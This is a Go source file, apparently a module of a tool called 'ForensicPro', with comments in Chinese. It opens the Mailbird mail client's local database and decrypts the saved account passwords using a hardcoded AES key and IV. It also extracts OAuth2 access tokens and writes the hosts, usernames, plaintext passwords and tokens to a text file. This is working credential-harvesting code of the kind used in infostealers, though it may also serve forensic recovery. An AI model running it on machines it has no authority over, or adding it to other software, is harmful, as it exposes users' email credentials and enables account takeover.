package Mails

import (
	"ForensicPro/utils"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
)

var MailBirdName = "MailBird"

var key = []byte{
	53, 224, 133, 48, 138, 109, 145, 163, 150, 95,
	242, 55, 149, 209, 207, 54, 113, 222, 126, 91,
	98, 56, 213, 251, 219, 100, 166, 75, 211, 90,
	5, 83,
}

var iv = []byte{
	152, 15, 104, 206, 119, 67, 76, 71, 249, 233,
	14, 130, 244, 107, 76, 232,
}

func AESDecrypt(encryptedBytes []byte, bKey []byte, iv []byte) string {
	block, err := aes.NewCipher(bKey)
	if err != nil {
		panic(err.Error())
	}

	if len(encryptedBytes) < aes.BlockSize {
		panic("ciphertext too short")
	}

	cbc := cipher.NewCBCDecrypter(block, iv)
	cbc.CryptBlocks(encryptedBytes, encryptedBytes)

	// Unpad PKCS7
	padding := encryptedBytes[len(encryptedBytes)-1]
	return string(encryptedBytes[:len(encryptedBytes)-int(padding)])
}

func GetMailBirdInfo() string {
	var builder strings.Builder

	mailBirdPath := utils.GetLocalAppDataPath("Mailbird\\Store\\Store.db")
	if _, err := os.Stat(mailBirdPath); os.IsNotExist(err) {
		return ""
	}
	// 创建一个临时文件
	tempFile, err := os.CreateTemp("", "temp_sqlite-*.db")
	if err != nil {
		fmt.Printf("创建临时文件失败: %v\n", err)
		return ""
	}
	defer os.Remove(tempFile.Name()) // 确保临时文件在函数结束时被删除

	// 将数据库文件复制到临时文件
	if err := utils.CopyFile(mailBirdPath, tempFile.Name()); err != nil {
		fmt.Printf("复制文件失败: %v\n", err)
		return ""
	}

	// 检查临时文件是否正确创建
	if _, err := os.Stat(tempFile.Name()); os.IsNotExist(err) {
		fmt.Printf("临时文件 %s 不存在\n", tempFile.Name())
		return ""
	}
	// 打开临时数据库文件
	db, err := sql.Open("sqlite3", tempFile.Name())
	//db, err := sql.Open("sqlite3", dataPath)
	if err != nil {
		fmt.Printf("打开数据库文件失败: %v\n", err)
		return ""
	}
	defer db.Close()

	// 查询 Account 表中的 DataPath 字段
	rows, err := db.Query("SELECT Server_Host,Username,EncryptedPassword FROM Accounts")
	if err != nil {
		fmt.Printf("查询数据库失败: %v\n", err)
		return ""
	}
	defer rows.Close()
	// 获取查询结果的列数
	columns, err := rows.Columns()
	if err != nil {
		fmt.Printf("获取列数失败: %v\n", err)
		return ""
	}

	// 预分配切片以存储每一行的数据
	values := make([]interface{}, len(columns))
	valuePtrs := make([]interface{}, len(columns))

	for rows.Next() {
		for i := range columns {
			valuePtrs[i] = &values[i]
		}

		if err := rows.Scan(valuePtrs...); err != nil {
			fmt.Printf("扫描行失败: %v\n", err)
			return ""
		}

		var Server_Host string
		var Username string
		var EncryptedPassword string

		for i, col := range columns {
			switch col {
			case "Server_Host":
				Server_Host = values[i].(string)
			case "Username":
				Username = values[i].(string)
			case "EncryptedPassword":
				EncryptedPassword = values[i].(string)
			}
		}
		decodedKey, _ := base64.StdEncoding.DecodeString(EncryptedPassword)
		password := AESDecrypt(decodedKey, key, iv)
		if password == "" {
			password = EncryptedPassword
		}
		// 打印查询结果
		builder.WriteString(fmt.Sprintf("Server_Host: %s, Username: %s, password: %s\n", Server_Host, Username, password))
	}
	// 查询 OAuth2Credentials 表中的 AuthorizedAccountId 和 AccessToken 字段
	rows, err = db.Query("SELECT AuthorizedAccountId, AccessToken FROM OAuth2Credentials")
	if err != nil {
		fmt.Printf("查询数据库失败: %v\n", err)
		return ""
	}
	defer rows.Close()
	// 获取查询结果的列数
	columns, err = rows.Columns()
	if err != nil {
		fmt.Printf("获取列数失败: %v\n", err)
		return ""
	}

	// 预分配切片以存储每一行的数据
	values = make([]interface{}, len(columns))
	valuePtrs = make([]interface{}, len(columns))

	for rows.Next() {
		for i := range columns {
			valuePtrs[i] = &values[i]
		}

		if err := rows.Scan(valuePtrs...); err != nil {
			fmt.Printf("扫描行失败: %v\n", err)
			return ""
		}

		var AuthorizedAccountId string
		var AccessToken string

		for i, col := range columns {
			switch col {
			case "AuthorizedAccountId":
				AuthorizedAccountId = values[i].(string)
			case "AccessToken":
				AccessToken = values[i].(string)
			}
		}

		// 打印查询结果
		builder.WriteString(fmt.Sprintf("AuthorizedAccountId: %s, AccessToken: %s\n", AuthorizedAccountId, AccessToken))
	}
	return builder.String()

}
func MailBirdSave(path string) {

	info := GetMailBirdInfo()
	if info != "" {
		targetPath := filepath.Join(path, MailBirdName)
		if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
			log.Fatalf("创建目录失败: %v", err)
		}

		utils.WriteToFile(info, targetPath+"\\MailBird.txt")
	}
}
